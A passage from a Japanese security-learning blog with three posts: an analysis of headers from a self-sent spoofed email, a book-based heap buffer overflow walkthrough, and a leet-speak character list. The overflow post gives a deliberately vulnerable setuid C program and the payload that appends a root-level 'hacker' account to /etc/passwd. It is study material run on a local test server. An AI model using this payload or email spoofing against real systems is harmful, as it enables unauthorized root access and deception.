<p>９．Subject(送信者が付加)</p>

<p>メールのタイトル</p>

<p>&nbsp;</p>

<p>１０。Date（受信者側サーバが付加）</p>

<p>メールの受信日</p>

<p>&nbsp;</p>

<p>１１．MIME-Version</p>

<p>メールのMIMEのバージョン</p>

<p>&nbsp;</p>

<p>１２．Content-Type（送信者が付加）</p>

<p>メールの内容のタイプ。テキストやHTMLが指定される</p>

<p>&nbsp;</p>

<p>１３．Content-Transfer-Encoding</p>

<p>メールのエンコード方式</p>

<p>&nbsp;</p>

<p>１４．X-Mailer（送信者が付加）</p>

<p>送信者が使用したメールソフト</p>

<p>&nbsp;</p>

<p>上記は貼ったリンクの焼きまわしなので、リンク先のほうが詳しくのってます。</p>

<p>今度はぐぐれば出てくるようなWEBサービスを使って自分宛に偽装メール送って、ヘッダー解析してみます。</p>

<pre class="lang:default decode:true">Delivered-To: MY-ADDRESS@gmail.com

Received: by 10.14.8.133 with SMTP id 5csp72438eer;
        Thu, 25 Apr 2013 17:09:51 -0700 (PDT)

X-Received: by 10.66.118.172 with SMTP id kn12mr43838362pab.128.1366934990176;
        Thu, 25 Apr 2013 17:09:50 -0700 (PDT)

Return-Path: &lt;monemail2host@sg2nlhg005.shr.prod.sin2.secureserver.net&gt;

Received: from sg2nlshrout01.shr.prod.sin2.secureserver.net (sg2nlshrout01.shr.prod.sin2.secureserver.net. [182.50.132.193])
        by mx.google.com with ESMTP id vu9si8318923pbc.158.2013.04.25.17.09.49
        for &lt;MY-ADDRESS@gmail.com&gt;;
        Thu, 25 Apr 2013 17:09:50 -0700 (PDT)

Received-SPF: pass (google.com: domain of monemail2host@sg2nlhg005.shr.prod.sin2.secureserver.net designates 182.50.132.193 as permitted sender) client-ip=182.50.132.193;
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of monemail2host@sg2nlhg005.shr.prod.sin2.secureserver.net designates 182.50.132.193 as permitted sender) smtp.mail=monemail2host@sg2nlhg005.shr.prod.sin2.secureserver.net

Received: from sg2nlhg005.shr.prod.sin2.secureserver.net ([182.50.130.5])
by sg2nlshrout01.shr.prod.sin2.secureserver.net with bizsmtp

id UQ9n1l006077rsN01Q9ntY; Thu, 25 Apr 2013 17:09:47 -0700

Received: from sg2nlhg005.shr.prod.sin2.secureserver.net (localhost [127.0.0.1])
by sg2nlhg005.shr.prod.sin2.secureserver.net (8.14.4/8.12.11) with ESMTP id r3Q09mEq004103
for &lt;MY-ADDRESS@gmail.com&gt;; Thu, 25 Apr 2013 17:09:48 -0700

Received: (from monemail2host@localhost)
by sg2nlhg005.shr.prod.sin2.secureserver.net (8.14.4/8.14.4/Submit) id r3Q09mZb004099;
Thu, 25 Apr 2013 17:09:48 -0700
Date: Thu, 25 Apr 2013 17:09:48 -0700

To: MY-ADDRESS@gmail.com
From: FAKE &lt;fake@mail.com&gt;
Reply-to: FAKE &lt;FAKE.Y5iTotuWI918718-10787-EN@5ymail.com&gt;
Subject: congratulations
Message-ID: &lt;effc29d231e4f821bd2aecb06be251cc@BlackBerry-System&gt;
X-Priority: 3
X-Mailer: PHPMailer [version 1.73]
MIME-Version: 1.0
Content-Type: multipart/alternative;
boundary="b1_effc29d231e4f821bd2aecb06be251cc"

--b1_effc29d231e4f821bd2aecb06be251cc

Content-Type: text/plain; charset = "utf-8"
Content-Transfer-Encoding: 8bit
１００万円当選おめでとうございます！

--b1_effc29d231e4f821bd2aecb06be251cc
Content-Type: text/html; charset = "utf-8"
Content-Transfer-Encoding: 8bit
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;meta http-equiv="Content-Style-Type" content="text/css" /&gt;
&lt;title&gt;Send Anonymous Emails, Free Anonymous Email, Send Anonymous Emails with attactment, Anonymous Email Attached Files, Email Anonymous&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="wrapper"&gt;
&lt;div id="content"&gt;１００万円当選おめでとうございます！
&lt;/div&gt;
&lt;div id="info"&gt;&lt;hr /&gt;&lt;img src="http://www.5ymail.com/SB_stat.php?Code=Y5iTotuWI918718-10787" width="1" height="1" alt="" /&gt;&lt;h3&gt;This mail was sent with &lt;a href="http://www.5ymail.com"&gt;www.5yMail.com&lt;/a&gt;&lt;/h3&gt;&lt;h3&gt;It's 100% free, try it for yourself!&lt;/h3&gt;&lt;/div&gt;
&lt;div id="pub"&gt;&lt;a href="http://www.5ymail.com"&gt;&lt;img src="http://www.5ymail.com/uploads/images/logo.png" alt="Want to know who has sent you a message?" border="0" width="426" height="98"/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>


<p>１．名前なし (from monemail2host@localhost)からsg2nlhg005.shr.prod.sin2.secureserver.netへESMTPで送信</p>

<p>宛先は<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x4d;&#x59;&#45;&#x41;&#x44;&#x44;&#82;&#x45;&#83;&#83;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#x4d;&#89;&#45;&#65;&#68;&#68;&#x52;&#x45;&#83;&#x53;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a>(これは僕のアドレスです)</p>

<p>日時はThu, 25 Apr 2013 17:09:48 -0700</p>

<p>&nbsp;</p>

<p>２．sg2nlhg005.shr.prod.sin2.secureserver.netからsg2nlhg005.shr.prod.sin2.secureserver.netへSMTPで送信</p>

<p>宛先は<a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#77;&#89;&#x2d;&#65;&#x44;&#x44;&#82;&#x45;&#x53;&#83;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x4d;&#89;&#x2d;&#65;&#68;&#x44;&#x52;&#69;&#83;&#83;&#64;&#103;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;</a></p>

<p>日時はThu, 25 Apr 2013 17:09:48 -0700</p>

<p>&nbsp;</p>

<p>３．g2nlhg005.shr.prod.sin2.secureserver.net ([IPアドレス：182.50.130.5])からsg2nlshrout01.shr.prod.sin2.secureserver.netへbizsmtpを利用して送信</p>

<p>ここでようやくlocalhostから出た？bizsmtpの仕組みとかは今よくわからないけど、宛先が僕のアドレスではなく、idに置き換わってしまってますね</p>

<p>&nbsp;</p>

<p>４．ここも今は詳しくはわかりませんが、おそらくGoogleのメールサーバのSPF認証みたいです。passとなっているところから、とりあえず認証は通ってるみたいです。ここは一旦スルーで。とりあえず認証してる、とだけ。</p>

<p>&nbsp;</p>

<p>５．sg2nlshrout01.shr.prod.sin2.secureserver.net（IPアドレス[182.50.132.193]）からmx.google.comへESMTPで送信</p>

<p>宛先は<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x4d;&#89;&#45;&#x41;&#x44;&#x44;&#82;&#x45;&#x53;&#x53;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#77;&#89;&#x2d;&#x41;&#x44;&#68;&#x52;&#69;&#83;&#83;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p>

<p>日時はThu, 25 Apr 2013 17:09:50 -0700</p>

<p>ここでようやくgoogleのメールサーバまで届きました。</p>

<p>&nbsp;</p>

<p>これより上のX-ReceivedとReceivedはGoogleのメールサーバが転送を繰り返し、つけたヘッダです。Google内にあるたくさんのメールサーバを経由して目的のサーバまで転送している、ということだと思います。</p>

<p>&nbsp;</p>

<p>これで僕のアドレスにメールが届いています。さてそれはわかりました。</p>

<p>他ののヘッダも見てみます。</p>

<p>&nbsp;</p>

<p>・Delivered-To: <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6b;&#97;&#101;&#x64;&#x65;&#48;&#x36;&#49;&#x35;&#x32;&#x30;&#48;&#x30;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#x6b;&#97;&#101;&#x64;&#x65;&#x30;&#x36;&#49;&#x35;&#50;&#x30;&#48;&#x30;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></p>

<p>これもGoogle内で転送された際に付加されたと思います。実際にこのアドレスに送信しますよ、ということ</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>・To: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x4d;&#89;&#45;&#x41;&#68;&#68;&#82;&#x45;&#83;&#x53;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;">&#x4d;&#89;&#x2d;&#65;&#x44;&#x44;&#x52;&#x45;&#83;&#x53;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a></p>

<p>・From: FAKE <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x66;&#x61;&#107;&#101;&#64;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x66;&#97;&#x6b;&#101;&#x40;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a></p>

<p>この辺は僕が設定した部分です。Fromにあるメールアドレスを僕はもちろん持っていませんし、誰かが使ってるアドレスでもありません。ここには任意の文字を指定できます。メーラーでも、宛先はここが参照されます。</p>

<p>&nbsp;</p>

<p>・Reply-to: FAKE <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x46;&#x41;&#75;&#x45;&#x2e;&#x59;&#53;&#105;&#x54;&#x6f;&#x74;&#117;&#x57;&#73;&#57;&#49;&#56;&#55;&#49;&#56;&#x2d;&#49;&#x30;&#x37;&#x38;&#x37;&#x2d;&#69;&#78;&#x40;&#53;&#121;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x46;&#x41;&#75;&#69;&#x2e;&#x59;&#x35;&#x69;&#x54;&#x6f;&#116;&#x75;&#x57;&#x49;&#57;&#x31;&#56;&#x37;&#x31;&#x38;&#45;&#x31;&#x30;&#x37;&#x38;&#55;&#45;&#x45;&#78;&#64;&#x35;&#x79;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a></p>

<p>このメールに返信した場合は、このアドレスに届きます。</p>

<p>&nbsp;</p>

<p>・X-Mailer: PHPMailer [version 1.73]</p>

<p>これは詳しく調べたわけではないですが、おそらくPHPのmail関数で送られたもの、ということじゃないかな、と思います。</p>

<p>&nbsp;</p>

<p>重要な部分はこんな感じですかね。</p>

<p>この場合、受信者の立場から、ある程度信憑性がある情報はgoogleのメールサーバ内で付加されたReceivedの情報だけで、他は偽装が可能らしいです。（送信者個人が全て偽装可能、ということではないです）</p>

<p>今回は外部サービスを使ったFromの偽装と、それによる送信元の隠蔽ですが、普通はわざわざヘッダーを見ることもないので、騙されてしまうかもしれませんね・・・。</p>

<p>&nbsp;</p>

<p>僕がこのブログを書くために、試しで送ったこのメールもGoogleのフィルターを通過し、受信者に届いているわけですから、やっぱりセキュリティ機能を強化・整備も大切ですが、関わる個人が注意する、ということが一番重要ですね。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/04/20/wordpress33/">簡単なバッファオーバーフローを再現してみる（４）</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-04-20T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>前回に引き続き、<a href="http://www.amazon.co.jp/Hacking-%E7%BE%8E%E3%81%97%E3%81%8D%E7%AD%96%E8%AC%80-%E2%80%95%E8%84%86%E5%BC%B1%E6%80%A7%E6%94%BB%E6%92%83%E3%81%AE%E7%90%86%E8%AB%96%E3%81%A8%E5%AE%9F%E9%9A%9B-Jon-Erickson/dp/4873115140/ref=pd_sim_b_4">こちらの参考書</a>の内容を元にBOFサンプルを手元で再現し、動作を追ってみたいと思います。</p>

<p>(1)~(3)はスタックセグメントにおけるBOF発生を再現していましたが、今回はヒープセグメントと環境変数を使ったサンプルを再現してみたいと思います。(環境は(2)と同じ、最近のgdbだと同じ挙動を再現しませんでした。)</p>

<p>とりあえず書いた脆弱性を持ったサンプルがこちら。書籍にあるサンプルプログラムはmallocのエラーチェックとか、エラー出力専用の関数などが用意されていましたが、長くなるので今回はギリギリまで削って、必要最低限だけ抜き出して書き直しました。</p>

<pre class="lang:default decode:true">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

void ShowUsage(char *prog_name, char *filename){
    printf("output usage: foobar...");
    exit(0);
}

int main(int argc, char *argv[]){
    int user_id, fd;
    char *buffer, *datafile;

    buffer = (char *)malloc(100);
    datafile = (char *)malloc(20);
    strcpy(datafile, "./memo_app_data");

    if(argc &lt; 2) ShowUsage(argv[0], datafile);

    strcpy(buffer, argv[1]);

    fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND,S_IRUSR|S_IWUSR);
    user_id = getuid();

    if(write(fd, &user_id, 4) == -1) printf("[error]It failed in writing userID\n");
    write(fd, "\n", 1);

    if(write(fd, buffer, strlen(buffer)) == -1) printf("[error]It failed in writing buffer\n");
    write(fd, "\n", 1);

    if(close(fd) == -1) printf("[error] fatal close file\n");
    printf("-----end-----\n");

    //mallocで確保した領域は解放をする
    free(buffer);
    free(datafile);
}</pre>


<p>プログラムの動作はコード見てもらえればわかりやすいと思います。同じディレクトリにあるmemo_app_dataに対して、プログラムの実行ユーザのIDと、引数で与えた文字列を記録するだけの簡単なメモ帳プログラムですね。</p>

<p>&nbsp;</p>

<p>コンパイルしたら、このプログラムの所有者をrootにして、suidを設定して、gdbデバッグ開始</p>

<pre class="lang:sh decode:true">$gcc -g -o memo_app ./memo_app.c
$sudo chown root:root memo_app
$sudo chmod u+s memo_app
$gdb -q momo_app</pre>


<p>注目するべきは16,17行目のmalloc()関数です。malloc()関数はヒープセグメントに領域を確保して、先頭アドレスを返します。buffer(引数で与えるメモ帳に書き込む文字列)は100byte、datafile(ファイル名を格納しておく変数)は20byteそれぞれ確保されていますね。今まで変数宣言したときに、確保されるスタックセグメントとは、違った領域にアドレスが設定されています。</p>

<p>まずはそれを確認してみます。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.15.06.png" rel="image_group"><img class="alignnone size-full wp-image-351" alt="Screen Shot 2013-04-11 at 14.15.06" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.15.06.png?resize=362%2C293" data-recalc-dims="1" /></a></p>

<p>上の画像が、変数宣言を終えてすぐのそれぞれの変数のアドレスと、その中身。</p>

<p>スタックセグメントの規則通り、最初に宣言されているものから順番に上に詰まれていっているのがわかります。</p>

<p>次はmalloc()でbufferとdatafileに領域を確保した後</p>

<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.22.06.png" rel="image_group"><img class="alignnone size-full wp-image-353" alt="Screen Shot 2013-04-11 at 14.22.06" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.22.06.png?resize=405%2C83" data-recalc-dims="1" /></a></p>

<p>&nbsp;</p>

<p>bufferとdatafileの中にアドレスが格納されているのがわかります。このアドレスに飛んで中身を見てみます。</p>

<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.24.16.png" rel="image_group"><img class="alignnone size-full wp-image-354" alt="Screen Shot 2013-04-11 at 14.24.16" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.24.16.png?resize=341%2C191" data-recalc-dims="1" /></a></p>

<p>&nbsp;</p>

<p>bufferの後ろに4byte多く確保され(計104byte)、その後ろにdarafileの領域が確保されていることがわかります。bufferの中身を見てみます。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.23.43.png" rel="image_group"><img class="alignnone size-full wp-image-352" alt="Screen Shot 2013-04-11 at 14.23.43" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.23.43.png?resize=777%2C152" data-recalc-dims="1" /></a></p>

<p>&nbsp;</p>

<p>中身がほとんど０なのは、偶然です。（必ず０になるわけではないということ）必要があれば明示的に初期化する必要があります。datafileのほうは、strcpy()関数で初期化されているので、無論その値が入ります。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.32.54.png" rel="image_group"><img class="alignnone size-full wp-image-355" alt="Screen Shot 2013-04-11 at 14.32.54" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-11-at-14.32.54.png?resize=550%2C41" data-recalc-dims="1" /></a></p>

<p>では104byte確保されている変数bufferの中に104byteの文字をつっこんでみます。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-12.49.44.png" rel="image_group"><img class="alignnone size-full wp-image-376" alt="Screen Shot 2013-04-16 at 12.49.44" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-12.49.44.png?resize=898%2C54" data-recalc-dims="1" /></a></p>

<p>前々回でも利用したように、perlスクリプトを利用して、Aを104文字出力させています。この状態で変数buffer, datafileの中身を確認してみます。</p>

<p>まずはbuffer</p>

<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-12.53.08.png" rel="image_group"><img class="alignnone size-large wp-image-377" alt="Screen Shot 2013-04-16 at 12.53.08" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-12.53.08.png?resize=640%2C141" data-recalc-dims="1" /></a></p>

<p>16byteずつ表示しているのが6列と8byte、計104byte、A(asciiコードで0&#215;41)という文字が格納されているのがわかります。この状態で次はdatafileを見てみます。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-12.56.39.png" rel="image_group"><img class="alignnone size-full wp-image-378" alt="Screen Shot 2013-04-16 at 12.56.39" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-12.56.39.png?resize=570%2C84" data-recalc-dims="1" /></a></p>

<p>&nbsp;</p>

<p>中身は空っぽです。bufferには確保されている104byteの文字を格納しただけで、先ほど通常に動作させた場合のdatafileに格納されていた&#8221;./memo_app_data&#8221;という文字列はありません。</p>

<p>これは文字列の最後をnullで判定しているためです。bufferが104byte確保されている場合、104byteの文字列を代入すると、そこには104byteの文字列+1byteのnull文字の計105byteが変数bufferの先頭アドレスから格納されていきます。</p>

<p>なので、bufferから105byte目の変数datafileのアドレスはbufferの末尾に付加されたnullを指している、ということになります。だからこの場合、datafileの中身は空っぽになってます。</p>

<p>今度はbufferの中に104byte以上の文字列を挿入してみます。</p>

<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-14.27.47.png" rel="image_group"><img class="alignnone size-full wp-image-382" alt="Screen Shot 2013-04-16 at 14.27.47" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-14.27.47.png?resize=955%2C48" data-recalc-dims="1" /></a></p>

<p>これで104byteの&#8221;A&#8221;に&#8221;komaifile&#8221;という文字を追加したものをbufferに入れてみます。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-14.50.32.png" rel="image_group"><img class="alignnone size-large wp-image-383" alt="Screen Shot 2013-04-16 at 14.50.32" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-14.50.32.png?resize=640%2C91" data-recalc-dims="1" /></a></p>

<p>bufferの中身をみてみると、引数に渡した文字列全てが入っており、datafileには、105byte以降の文字が入っています。</p>

<p>このことから、105byte以降には、任意の文字列を指定することができます。今回、このアプリケーションはメモ帳アプリなので、datafileの中身は、メモを書き込むファイルだということが推測されます。ここで大切なのは、SUIDが設定されているので、root権限でmemo_app_dataというファイルに書き込みが行われている、ということです。</p>

<p>つまり、datafileの文字列を任意に指定できる、ということは、任意のファイルにroot権限で書き込みができる可能性がある、ということになります。</p>

<p>&nbsp;</p>

<p>ただし、制約もあります。書き込む対象ファイルがdatafileに入ってるのと同じように、書き込む文字列はbufferに入っています。</p>

<p>ということは、上記の場合Aが104文字にkomaifileが追加された文字列が、ファイルkomaifileに書き込むことができる、ということです。任意のファイルに書き込むことはできますが、書き込む文字列は任意にできるのは104byteまで、末尾にはファイル名がついてしまう、という制約が、この場合は確実につきます。</p>

<p>&nbsp;</p>

<p>/etc/passwdを指定して任意のユーザを追加してみます。</p>

<p>まずは/etc/passwdの書式を確認してみましょう。</p>

<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-16.36.04.png" rel="image_group"><img class="alignnone  wp-image-387" alt="Screen Shot 2013-04-16 at 16.36.04" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-16-at-16.36.04.png?resize=701%2C553" data-recalc-dims="1" /></a></p>

<p>検証用にローカルに立てているサーバなので、公開しても問題ないものです。</p>

<p>1行に一人のユーザの情報が格納されていて、書式は</p>

<blockquote><p>ユーザ名：パスワードハッシュ：ユーザID：グループID：メモ的な何か：ホームディレクトリ：デフォルトで仕様するシェル</p></blockquote>

<p>というようになっています。パスワードが共通してXになっているのはシャドウファイルが利用されているということです。</p>

<p>シャドウファイルが利用されているパスワードは、/etc/shadowに別途暗号化され格納されていますが、ここに直接パスワードハッシュを格納することもできます。よって</p>

<blockquote><p>hacker:パスワードハッシュ:0:0:hogehoge&#8230;..:/root:/bin/bash</p></blockquote>

<p>という1行をこのファイルに挿入することができれば、root権限を保持したhackerというユーザをシステムに追加することができるようになる、ということです。</p>

<p>/etc/passwdと/etc/shadowに関して、こちらに詳しく書かれています⇨<a href="http://www.usupi.org/sysad/111.html">参考リンク</a></p>

<p>&nbsp;</p>

<p>次はパスワードハッシュをどのようにして得るか、ということが問題になります。パスワードハッシュは、DES,MD5,SHA-256, SHA-512のなかから選択することができます。ただし、DESは本来使うべきではありません。（強度が他に比べて極端に低いので）僕が普段利用している公開サーバも、デフォルトでSHA-512が利用されています。</p>

<p>ちなみに、/etc/shadowを見ると、それぞれのユーザのパスワードが、どの方式でハッシュ値得ているか、がわかります。</p>

<ol>
<li>$1$で始まるパスワード⇨MD5　($1$から$まではsalt)</li>
<li>$5$で始まるパスワード⇨SHA-256 ($1$から$まではsalt)</li>
<li>$6$で始まるパスワード⇨SHA-512 ($1$から$まではsalt)</li>
<li>何もついていないもの⇨DES (頭二文字がsalt)</li>
</ol>


<p>となっています。</p>

<p>さきほどあげた参考リンクにもありますが、DESとMD5はperlのcrypt()関数で簡単に得ることができます。</p>

<pre class="lang:perl decode:true"># sample
print crypt($ARGV[0], $ARGV[1])."\n";</pre>


<p>コマンドラインから実行して</p>

<p>一つ目の引数がハッシュ値を得たい、平文のパスワード</p>

<p>二つ目がsaltの指定</p>

<p>になっています。シェルから$ perl -e &#8220;print crypt(&#8216;planetext&#8217;, &#8216;salt&#8217;)&#8221;で呼び出すと便利です。</p>

<p>これで平文：password、salt:AAでDES暗号にしたものがこちらです</p>

<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-19-at-12.07.46.png" rel="image_group"><img class="alignnone size-full wp-image-404" alt="Screen Shot 2013-04-19 at 12.07.46" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-19-at-12.07.46.png?resize=286%2C54" data-recalc-dims="1" /></a></p>

<p>これで、情報が揃いました。</p>

<p>hacker:AA6tOYSfGxd/A:0:0:hogehoge&#8230;..:/root:/bin/bash</p>

<p>これでroot権限を持ったログインID:hacker、パスワード:passwordというユーザの情報が作れました。これを/etc/passwdに追加できれば成功です。</p>

<p>ただ、先ほど挙げたように、今回BOFさせる文字列には制限があります。文字列の最後が/etc/passwdになっていなければ、/etc/passwdに追加できない、ということです。つまり先ほどのユーザ情報の文字列は</p>

<p>hacker:AA6tOYSfGxd/A:0:0:hogehoge&#8230;..:&#8230;&#8230;/etc/passwd</p>

<p>となっていなければなりません。しかしそれだと、最後の項目がユーザのシェル、というユーザ情報が壊れてしまいます。</p>

<p>&nbsp;</p>

<p>そこで、末尾に/etc/passwdで終わっても、シェルへのパスを指すように工夫します。ここではシンボリックリンクを利用します。通常、利用されるシェルがbashの場合はbashのパス表示します。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-20.33.46.png" rel="image_group"><img class="alignnone size-full wp-image-407" alt="Screen Shot 2013-04-20 at 20.33.46" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-20.33.46.png?resize=423%2C37" data-recalc-dims="1" /></a></p>

<p>まぁだいたいは/bin/bashだと思います。このファイルに対してシンボリックリンクを作成します。</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-20.39.13.png" rel="image_group"><img class="alignnone size-full wp-image-408" alt="Screen Shot 2013-04-20 at 20.39.13" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-20.39.13.png?resize=510%2C118" data-recalc-dims="1" /></a></p>

<p>こんな感じに、/tmp/etc/passwdファイルを作成して、/bin/bashへのシンボリックリンクにします。</p>

<p>こうすることで、/tmp/etc/passwdがシェルへのリンクになりました。</p>

<p>読ませるファイルは/etc/passwd</p>

<p>バッシュへのパスは/tmp/etc/passwd</p>

<p>これで先ほどの制約をクリアできる形になりました。</p>

<p>よって</p>

<p>hacker:AA6tOYSfGxd/A:0:0:hogehoge(ここで文字数調整):/root:/tmp(ここまでで104文字)/etc/passwd</p>

<p>の１行をメモ帳プログラムに引数として渡せば、ログインID:hacker、パスワード:passwordのroot権限をもったユーザが追加されることになります。文字数を上手に調整して、引数に渡します</p>

<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-21.17.13.png" rel="image_group"><img class="alignnone size-full wp-image-409" alt="Screen Shot 2013-04-20 at 21.17.13" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-21.17.13.png?resize=799%2C43" data-recalc-dims="1" /></a></p>

<p>&nbsp;</p>

<p>これを実行した後に、/etc/passwdの中身を見てみます</p>

<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-21.26.46.png" rel="image_group"><img class="alignnone size-full wp-image-410" alt="Screen Shot 2013-04-20 at 21.26.46" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-20-at-21.26.46.png?resize=803%2C381" data-recalc-dims="1" /></a></p>

<p>&nbsp;</p>

<p>/etc/passwdの末尾に先ほどの文字列が挿入されていますね。これが手元で再現したときは感動大きかったです（笑）</p>

<p>そのまま先ほど追加した行に書いたログインIDでログインできていることも、root権限になっていることも確認できると思います。</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>こんな感じでした。perlコマンドの-eオプションは汎用性非常に高いですね。ここまででBOF再現は以上です。更に詳しい解説だったり、他の手法もいくつか参考書には掲載されているので興味があるかたは是非読んでみて下さい。</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/04/15/wordpress32/">Leet文字まとめ</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-04-15T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>nullconでleet文字を使った、暗号（？）が多く出題されていたので、よく使われているらしいものをwikipediaからピックアップしてまとめておきます。</p>

<p>leatspeakで[leet]を置き換えると[1337]となる、みたいな感じです。慣れないと全然読めないですよね・・・。</p>

<p><a href="http://ja.wikipedia.org/wiki/Leet">[wikipedia]Leet</a></p>

<p>アルファベットと頻繁に見かけるleetspeak対応</p>

<ul>
<li><span style="line-height: 13px;">A     : 4, /\, @, Д</span></li>
<li>B     : |3, 8</li>
<li>C     : &lt;, (, [</li>
<li>D    : |)</li>
<li>E     : 3</li>
<li>F     : |=</li>
<li>G     : 6, 9</li>
<li>H    : <span style="font-family: Arial, Helvetica, sans-serif;">|&ndash;|, 9#</span></li>
<li>I      : 1, !, |</li>
<li>J     : ?</li>
